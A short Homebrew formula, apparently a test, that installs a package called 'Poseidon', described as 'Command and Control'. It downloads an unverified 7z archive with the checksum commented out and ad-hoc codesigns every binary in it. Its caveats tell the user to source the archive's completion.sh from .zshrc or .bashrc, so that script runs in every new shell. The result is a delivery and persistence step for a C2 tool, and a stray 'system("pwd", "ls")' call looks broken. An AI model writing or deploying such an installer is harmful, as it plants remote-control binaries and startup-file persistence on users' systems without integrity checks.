class Poseidon < Formula
    desc "Command and Control"
    homepage "https://github.com/JonEagle/"
    url "https://github.com/JonEagle/homebrew-test/raw/refs/heads/main/poseidon-1.33.7.7z"
    # sha256 "B0B0AFF03111FB463A63C37EA187206A6E47147FF4B396EB4D53F43B7B404B43"
    version "1.33.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system("pwd", "ls")
          end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
